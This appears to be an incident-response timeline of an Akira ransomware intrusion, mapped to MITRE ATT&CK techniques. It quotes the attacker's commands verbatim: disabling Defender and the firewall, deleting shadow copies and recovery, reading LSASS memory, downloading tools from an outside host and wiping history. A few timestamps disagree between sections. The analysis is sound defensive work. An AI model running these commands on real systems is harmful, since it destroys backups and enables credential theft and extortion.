# ⏱️ Attack Timeline

All timestamps are in **UTC**. The full attack from initial re-entry to encryption took approximately **3 hours**.

---

## Visual Timeline

```
19:15 ──────────────────────────────── INITIAL ACCESS
      AnyDesk executed from C:\Users\Public (as-pc2)
      Attacker IP: 88.97.164.155 via port 7070

19:17 ──────────────────────────────── TOOL DEPLOYMENT
      bitsadmin.exe attempts tool downloads (fails)
      Invoke-WebRequest downloads scan.exe + wsync.exe
      Source: sync.cloud-endpoint.net

19:22 ──────────────────────────────── C2 BEACON ACTIVE
      wsync.exe deployed to C:\ProgramData\
      Second version deployed at 20:44 (beacon rotation)

19:17 ──────────────────────────────── RECONNAISSANCE
      scan.exe (AdvancedIpScanner) runs network scan
      Args: /portable "C:/Users/david.mitchell/Downloads/" /lng en_us

20:03 ──────────────────────────────── DEFENSE EVASION
      kill.bat executed via cmd.exe
      Set-MpPreference -DisableRealtimeMonitoring $true
      net stop WinDefend, WdNisSvc, SecurityHealthService
      netsh advfirewall set allprofiles state off

21:03 ──────────────────────────────── REGISTRY TAMPERING
      reg.exe sets DisableAntiSpyware = 1
      HKLM\SOFTWARE\Policies\Microsoft\Windows Defender

21:09 ──────────────────────────────── BACKUP DESTRUCTION
      vssadmin delete shadows /all /quiet
      wmic shadowcopy delete
      bcdedit /set {default} recoveryenabled No
      sc stop VSS / sc stop wbengine

21:11 ──────────────────────────────── CREDENTIAL THEFT
      tasklist | findstr lsass (x2 — confirms LSASS running)
      powershell.exe reads lsass.exe process memory
      Named pipe: \Device\NamedPipe\lsass

22:17 ──────────────────────────────── LATERAL MOVEMENT
      as.srv.administrator authenticates to as-srv
      net view \\10.1.0.154
      net view \\10.1.0.183

22:17 ──────────────────────────────── DATA EXFILTRATION
      st.exe compresses data → exfil_data.zip
      Staged at C:\Users\Public\exfil_data.zip

22:18 ──────────────────────────────── RANSOMWARE DEPLOYMENT
      updater.exe (Akira) executed on as-srv
      Source: cdn.cloud-endpoint.net

22:18:33 ────────────────────────────── ENCRYPTION BEGINS
      .akira extension appended to all files in C:\Shares
      akira_readme.txt dropped in each directory

22:20 ──────────────────────────────── CLEANUP
      clean.bat deletes updater.exe
      ConsoleHost_history.txt deleted (PowerShell history)
```

---

## Detailed Event Log

| Time (UTC) | Host | Account | Event | MITRE |
|---|---|---|---|---|
| 19:15 | as-pc2 | david.mitchell | AnyDesk.exe executed from `C:\Users\Public` | T1219 |
| 19:17 | as-pc2 | david.mitchell | bitsadmin.exe attempts download from sync.cloud-endpoint.net | T1197 |
| 19:17 | as-pc2 | david.mitchell | Invoke-WebRequest downloads scan.exe | T1105 |
| 19:22 | as-pc2 | david.mitchell | Invoke-WebRequest downloads wsync.exe | T1105 |
| 19:17 | as-pc2 | david.mitchell | scan.exe (AdvancedIpScanner) executed with /portable flag | T1046 |
| 20:03 | as-pc2 | david.mitchell | kill.bat executed — Defender disabled | T1562.001 |
| 20:03 | as-pc2 | david.mitchell | `net stop WinDefend` and related services | T1562.001 |
| 20:09 | as-pc2 | david.mitchell | `netsh advfirewall set allprofiles state off` | T1562.004 |
| 20:09 | as-pc2 | david.mitchell | `vssadmin delete shadows /all /quiet` | T1490 |
| 20:09 | as-pc2 | david.mitchell | `wmic shadowcopy delete` | T1490 |
| 20:09 | as-pc2 | david.mitchell | `bcdedit /set {default} recoveryenabled No` | T1490 |
| 20:44 | as-pc2 | david.mitchell | wsync.exe v2 deployed (beacon rotation) | T1105 |
| 21:03 | as-pc2 | david.mitchell | `DisableAntiSpyware` registry key set to 1 | T1112 |
| 21:11 | as-pc2 | david.mitchell | `tasklist \| findstr lsass` (first run) | T1057 |
| 21:11 | as-pc2 | david.mitchell | `tasklist \| findstr lsass` (second run) | T1057 |
| 21:14 | as-pc2 | david.mitchell | LSASS memory read via `\Device\NamedPipe\lsass` | T1003.001 |
| 22:17 | as-srv | as.srv.administrator | Lateral movement authenticated to as-srv | T1078.003 |
| 22:17 | as-srv | as.srv.administrator | `net view \\10.1.0.154` | T1135 |
| 22:17 | as-srv | as.srv.administrator | `net view \\10.1.0.183` | T1135 |
| 22:17 | as-srv | as.srv.administrator | `st.exe` creates `exfil_data.zip` | T1560 |
| 22:18 | as-srv | as.srv.administrator | `updater.exe` deployed to `C:\ProgramData\` | T1036.005 |
| 22:18:33 | as-srv | as.srv.administrator | Encryption begins — `.akira` extension | T1486 |
| 22:18:33 | as-srv | as.srv.administrator | `akira_readme.txt` dropped in directories | T1486 |
| 22:20 | as-srv | as.srv.administrator | `clean.bat` deletes `updater.exe` | T1070 |
| 22:20 | as-srv | as.srv.administrator | `ConsoleHost_history.txt` deleted | T1070 |

